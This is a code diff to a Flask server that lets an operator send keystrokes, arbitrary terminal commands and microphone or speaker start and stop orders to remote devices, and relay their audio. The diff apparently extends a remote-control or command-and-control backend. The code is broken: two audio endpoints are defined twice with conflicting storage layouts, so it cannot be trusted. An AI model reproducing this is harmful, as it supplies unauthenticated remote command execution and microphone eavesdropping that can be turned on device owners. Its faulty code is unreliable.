@@ -27,6 +27,14 @@ screen_store = {}
 mouse_control_store = {}
 # Store for mouse control results
 mouse_control_results = {}
+# Store for keyboard input commands
+keyboard_store = {}
+# Store for keyboard input results
+keyboard_results = {}
+# Store for audio data
+audio_store = {}
+# Buffer size for audio data
+AUDIO_BUFFER_SIZE = 50  # Store up to 50 audio chunks per device
 
 @app.route('/')
 def home():
@@ -302,6 +310,319 @@ def set_quality(device_id):
     return jsonify({
         "status": "success", 
         "message": f"Quality set to {quality}",
+        "command_id": command_id
+    })
+
+# Keyboard input API endpoints
+@app.route('/api/keyboard/<device_id>', methods=['POST'])
+def keyboard_input(device_id):
+    """API endpoint to handle keyboard input commands"""
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    data = request.get_json()
+    if not data or 'type' not in data or 'input' not in data:
+        return jsonify({"error": "Invalid keyboard data"}), 400
+    
+    command_id = str(time.time())
+    keyboard_store[command_id] = {
+        "device_id": device_id,
+        "type": data['type'],  # 'text' or 'shortcut'
+        "input": data['input'], # text content or key combination
+        "status": "pending",
+        "timestamp": time.time()
+    }
+    
+    return jsonify({
+        "status": "success", 
+        "message": "Keyboard input command sent",
+        "command_id": command_id
+    })
+
+@app.route('/api/get-keyboard/<device_id>', methods=['GET'])
+def get_keyboard_input(device_id):
+    """API endpoint for receiver to get pending keyboard commands"""
+    # Get pending commands for this device
+    pending_commands = []
+    for command_id, command in list(keyboard_store.items()):
+        if command["device_id"] == device_id and command["status"] == "pending":
+            command_copy = command.copy()
+            command_copy["command_id"] = command_id
+            pending_commands.append(command_copy)
+            # Mark as processing
+            keyboard_store[command_id]["status"] = "processing"
+    
+    return jsonify({
+        "status": "success",
+        "commands": pending_commands
+    })
+
+@app.route('/api/keyboard-result/<device_id>', methods=['POST'])
+def keyboard_input_result(device_id):
+    """API endpoint for receiver to report keyboard command results"""
+    data = request.get_json()
+    if not data or 'command_id' not in data or 'result' not in data:
+        return jsonify({"error": "Invalid result data"}), 400
+    
+    command_id = data['command_id']
+    if command_id not in keyboard_store:
+        return jsonify({"error": "Command not found"}), 404
+    
+    # Update command status
+    keyboard_store[command_id]["status"] = "completed"
+    keyboard_results[command_id] = {
+        "result": data['result'],
+        "timestamp": time.time()
+    }
+    
+    return jsonify({"status": "success"})
+
+@app.route('/api/get-keyboard-result/<command_id>', methods=['GET'])
+def get_keyboard_input_result(command_id):
+    """API endpoint to get the result of a keyboard command"""
+    if command_id not in keyboard_store:
+        return jsonify({"error": "Command not found"}), 404
+    
+    if command_id not in keyboard_results:
+        return jsonify({
+            "status": keyboard_store[command_id]["status"],
+            "result": None
+        })
+    
+    return jsonify({
+        "status": "completed",
+        "result": keyboard_results[command_id]["result"]
+    })
+
+# Audio streaming API endpoints
+@app.route('/api/audio/upload/<device_id>', methods=['POST'])
+def upload_audio(device_id):
+    """API endpoint to receive audio data from client"""
+    if request.method == 'POST':
+        data = request.json
+        
+        if not data or 'audio_data' not in data:
+            return jsonify({"error": "Invalid audio data"}), 400
+        
+        # Initialize device audio buffer if not exists
+        if device_id not in audio_store:
+            audio_store[device_id] = {
+                "microphone": [],
+                "timestamp": time.time()
+            }
+        
+        # Add to audio buffer (FIFO queue)
+        audio_store[device_id]["microphone"].append({
+            "audio_data": data['audio_data'],
+            "format": data.get('format', 'pcm'),
+            "channels": data.get('channels', 1),
+            "rate": data.get('rate', 16000),
+            "timestamp": data.get('timestamp', time.time())
+        })
+        
+        # Limit buffer size
+        if len(audio_store[device_id]["microphone"]) > AUDIO_BUFFER_SIZE:
+            audio_store[device_id]["microphone"] = audio_store[device_id]["microphone"][-AUDIO_BUFFER_SIZE:]
+        
+        # Update timestamp
+        audio_store[device_id]["timestamp"] = time.time()
+        
+        return jsonify({"status": "success"})
+    
+    return jsonify({"error": "Method not allowed"}), 405
+
+@app.route('/api/audio/download/<device_id>', methods=['GET'])
+def download_audio(device_id):
+    """API endpoint to send audio data to client"""
+    if device_id not in audio_store or not audio_store[device_id]["microphone"]:
+        return jsonify({"status": "no_data"}), 200
+    
+    # Get the oldest audio chunk and remove it from the buffer
+    audio_chunk = audio_store[device_id]["microphone"].pop(0)
+    
+    return jsonify({
+        "status": "success",
+        "audio_data": audio_chunk["audio_data"],
+        "format": audio_chunk.get("format", "pcm"),
+        "channels": audio_chunk.get("channels", 1),
+        "rate": audio_chunk.get("rate", 16000),
+        "timestamp": audio_chunk.get("timestamp", time.time())
+    })
+
+@app.route('/api/audio/devices/<device_id>', methods=['GET'])
+def get_audio_devices(device_id):
+    """API endpoint to get available audio devices"""
+    # This endpoint simply proxies the request to the client
+    # The client will need to check this endpoint and respond with device info
+    
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    command_id = str(time.time())
+    audio_store[command_id] = {
+        "device_id": device_id,
+        "command": "get_devices",
+        "status": "pending",
+        "timestamp": time.time()
+    }
+    
+    return jsonify({
+        "status": "success",
+        "message": "Command sent to device",
+        "command_id": command_id
+    })
+
+@app.route('/api/audio/start/<device_id>', methods=['POST'])
+def start_audio(device_id):
+    """API endpoint to start audio streaming (microphone or speakers)"""
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    data = request.json
+    if not data or 'type' not in data:
+        return jsonify({"error": "Invalid request data"}), 400
+    
+    audio_type = data['type']  # 'microphone' or 'speaker'
+    
+    if audio_type not in ['microphone', 'speaker']:
+        return jsonify({"error": "Invalid audio type"}), 400
+    
+    command_id = str(time.time())
+    command_store[command_id] = {
+        "command": f"!audio_start {audio_type}",
+        "device_id": device_id,
+        "status": "pending",
+        "output": None,
+        "timestamp": time.time()
+    }
+    
+    return jsonify({
+        "status": "success", 
+        "message": f"Started {audio_type}",
+        "command_id": command_id
+    })
+
+@app.route('/api/audio/stop/<device_id>', methods=['POST'])
+def stop_audio(device_id):
+    """API endpoint to stop audio streaming (microphone or speakers)"""
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    data = request.json
+    if not data or 'type' not in data:
+        return jsonify({"error": "Invalid request data"}), 400
+    
+    audio_type = data['type']  # 'microphone' or 'speaker'
+    
+    if audio_type not in ['microphone', 'speaker']:
+        return jsonify({"error": "Invalid audio type"}), 400
+    
+    command_id = str(time.time())
+    command_store[command_id] = {
+        "command": f"!audio_stop {audio_type}",
+        "device_id": device_id,
+        "status": "pending",
+        "output": None,
+        "timestamp": time.time()
+    }
+    
+    return jsonify({
+        "status": "success", 
+        "message": f"Stopped {audio_type}",
+        "command_id": command_id
+    })
+
+@app.route('/api/audio/upload/<device_id>', methods=['POST'])
+def upload_audio(device_id):
+    """API endpoint to receive audio data from device"""
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    data = request.json
+    if not data or 'audio_data' not in data:
+        return jsonify({"error": "Invalid audio data"}), 400
+    
+    # Get the audio type (microphone or speaker)
+    audio_type = data.get('audio_type', 'microphone')
+    
+    # Store audio data in memory (or could save to temporary file)
+    audio_id = str(time.time())
+    audio_store[audio_id] = {
+        "device_id": device_id,
+        "audio_data": data['audio_data'],
+        "audio_type": audio_type,
+        "timestamp": time.time()
+    }
+    
+    # Limit the number of audio chunks stored to prevent memory issues
+    # Keep only the most recent 100 chunks
+    if len(audio_store) > 100:
+        oldest_id = min(audio_store.keys(), key=lambda k: audio_store[k]['timestamp'])
+        del audio_store[oldest_id]
+    
+    return jsonify({
+        "status": "success", 
+        "message": "Audio data received"
+    })
+
+@app.route('/api/audio/download/<device_id>', methods=['GET'])
+def download_audio(device_id):
+    """API endpoint to send audio data to device"""
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    # Get the audio type (microphone or speaker)
+    audio_type = request.args.get('audio_type', 'speaker')
+    
+    # Find the most recent audio data for this device and type
+    relevant_audio = [
+        item for item_id, item in audio_store.items()
+        if item['audio_type'] == audio_type and item['device_id'] == device_id
+    ]
+    
+    if not relevant_audio:
+        return jsonify({
+            "status": "success",
+            "message": "No audio data available"
+        })
+    
+    # Sort by timestamp and get the most recent
+    most_recent = sorted(relevant_audio, key=lambda item: item['timestamp'], reverse=True)[0]
+    
+    # Remove this item from the store to avoid replaying it
+    for key, item in list(audio_store.items()):
+        if item['timestamp'] == most_recent['timestamp'] and item['audio_type'] == audio_type:
+            del audio_store[key]
+            break
+    
+    return jsonify({
+        "status": "success",
+        "audio_data": most_recent['audio_data']
+    })
+
+# Terminal command API endpoints
+@app.route('/api/terminal/<device_id>', methods=['POST'])
+def terminal_command(device_id):
+    """API endpoint to send terminal command to client"""
+    if device_id not in screen_store:
+        return jsonify({"error": "Device not found"}), 404
+    
+    data = request.json
+    if not data or 'command' not in data:
+        return jsonify({"error": "Invalid command data"}), 400
+    
+    command_id = str(time.time())
+    command_store[command_id] = {
+        "command": data['command'],
+        "device_id": device_id,
+        "status": "pending",
+        "output": None,
+        "timestamp": time.time()
+    }
+    
+    return jsonify({
+        "status": "success", 
+        "message": "Command sent to device",
         "command_id": command_id
     })
 
